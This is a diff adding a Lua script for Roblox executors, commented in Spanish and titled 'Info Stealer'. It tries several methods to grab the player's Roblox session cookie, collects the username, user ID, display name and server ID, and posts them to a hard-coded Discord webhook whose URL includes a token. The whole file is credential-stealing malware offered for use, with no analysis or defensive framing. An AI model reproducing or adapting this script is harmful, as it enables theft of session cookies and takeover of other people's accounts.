@@ -1,0 +1,182 @@
+-- Info Stealer con Verificación y Debug
+local webhook = "https://discord.com/api/webhooks/1530793538684452885/ZYEJFZ0ZKFm94KvPQgbWXBfHtjHJJ1PB1Bwel9kxwigxssIMgIYlX34QQswEYimnEuXv"
+
+-- Función para mostrar mensajes en la consola del ejecutor
+local function log(msg)
+    print("[Stealer] " .. msg)
+end
+
+log("Iniciando Info Stealer...")
+
+-- Verificar HttpService
+local http = game:GetService("HttpService")
+if not http then
+    log("ERROR: HttpService no disponible")
+    return
+end
+
+log("HttpService encontrado. Activando...")
+http.HttpEnabled = true
+
+if not http.HttpEnabled then
+    log("ERROR: No se pudo activar HttpEnabled")
+    return
+end
+
+log("HttpEnabled activado correctamente")
+
+-- Función para obtener la cookie
+local function getRobloxCookie()
+    log("Intentando obtener cookie...")
+    
+    -- Método 1: GetCookies
+    local success, result = pcall(function()
+        log("  Método 1: HttpService:GetCookies()")
+        return http:GetCookies("https://www.roblox.com")
+    end)
+    if success and result and result ~= "" then
+        log("  ✅ Cookie obtenida con Método 1")
+        return result
+    end
+    log("  ❌ Método 1 falló")
+    
+    -- Método 2: getcookie() (función nativa del ejecutor)
+    local success2, result2 = pcall(function()
+        log("  Método 2: getcookie()")
+        return getcookie("https://www.roblox.com")
+    end)
+    if success2 and result2 and result2 ~= "" then
+        log("  ✅ Cookie obtenida con Método 2")
+        return result2
+    end
+    log("  ❌ Método 2 falló")
+    
+    -- Método 3: Extraer de la URL de autenticación
+    local success3, result3 = pcall(function()
+        log("  Método 3: Extraer de URL de auth")
+        local authUrl = http:GetAsync("https://www.roblox.com/game/")
+        if authUrl then
+            local cookie = authUrl:match(".RBXSession=(.-);")
+            if cookie then
+                return cookie
+            end
+        end
+    end)
+    if success3 and result3 and result3 ~= "" then
+        log("  ✅ Cookie obtenida con Método 3")
+        return result3
+    end
+    log("  ❌ Método 3 falló")
+    
+    -- Método 4: Atributo del jugador (fallback)
+    local success4, result4 = pcall(function()
+        log("  Método 4: GetAttribute('Cookie')")
+        local player = game.Players.LocalPlayer
+        if player then
+            return player:GetAttribute("Cookie")
+        end
+    end)
+    if success4 and result4 and result4 ~= "" then
+        log("  ✅ Cookie obtenida con Método 4")
+        return result4
+    end
+    log("  ❌ Método 4 falló")
+    
+    log("❌ TODOS los métodos fallaron. No se pudo obtener cookie.")
+    return nil
+end
+
+-- Función para obtener información del jugador
+local function getPlayerInfo()
+    log("Obteniendo información del jugador...")
+    local player = game.Players.LocalPlayer
+    if not player then
+        log("  ❌ No se pudo obtener LocalPlayer")
+        return nil, nil, nil
+    end
+    log("  ✅ Jugador encontrado: " .. tostring(player.Name))
+    return player.UserId, player.Name, player.DisplayName
+end
+
+-- Función para enviar al webhook
+local function sendToWebhook(cookie, userId, userName, displayName)
+    log("Preparando envío al webhook...")
+    
+    if not webhook or webhook == "" or webhook == "https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN" then
+        log("ERROR: Webhook no configurado. Reemplaza TU_WEBHOOK_ID y TU_WEBHOOK_TOKEN")
+        return
+    end
+    
+    local payload = {
+        content = "**Info Stealer Reporte**",
+        embeds = {{
+            title = "📊 Información de la Cuenta",
+            color = cookie and 0x00FF00 or 0xFF0000,
+            fields = {
+                { name = "👤 Usuario", value = userName or "Desconocido", inline = true },
+                { name = "🖊️ Display Name", value = displayName or "Desconocido", inline = true },
+                { name = "🆔 User ID", value = tostring(userId or "Desconocido"), inline = true },
+                { name = "🔑 Cookie", value = cookie and "```" .. cookie .. "```" or "❌ No cookies encontradas!", inline = false },
+                { name = "📅 Fecha", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true },
+                { name = "🎮 Servidor ID", value = game.JobId or "Desconocido", inline = true }
+            },
+            footer = { text = "Info Stealer v2.0 | Roblox" }
+        }}
+    }
+    
+    local json = http:JSONEncode(payload)
+    if not json then
+        log("ERROR: No se pudo codificar JSON")
+        return
+    end
+    
+    log("Enviando petición POST a: " .. webhook)
+    local success, response = pcall(function()
+        return http:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
+    end)
+    
+    if success then
+        log("✅ Envío exitoso al webhook")
+    else
+        log("❌ Error al enviar: " .. tostring(response))
+        log("  Posibles causas: webhook inválido, HttpService bloqueado, URL mal formada")
+    end
+end
+
+-- Función principal
+local function main()
+    log("=== INICIANDO INFO STEALER ===")
+    
+    -- Verificar que el jugador existe
+    local player = game.Players.LocalPlayer
+    if not player then
+        log("ERROR: No se pudo obtener LocalPlayer. ¿Estás en un juego?")
+        return
+    end
+    log("Jugador: " .. player.Name)
+    
+    -- Obtener info del jugador
+    local userId, userName, displayName = getPlayerInfo()
+    log("UserID: " .. tostring(userId))
+    log("UserName: " .. tostring(userName))
+    
+    -- Obtener cookie
+    local cookie = getRobloxCookie()
+    if cookie then
+        log("Cookie obtenida: " .. string.sub(cookie, 1, 20) .. "...")
+    else
+        log("Cookie: NO ENCONTRADA")
+    end
+    
+    -- Enviar al webhook
+    sendToWebhook(cookie, userId, userName, displayName)
+    
+    log("=== INFO STEALER FINALIZADO ===")
+end
+
+-- Ejecutar con manejo de errores
+local success, err = pcall(main)
+if not success then
+    log("ERROR FATAL: " .. tostring(err))
+    log("  El script falló completamente. Revisa el mensaje de error.")
+end
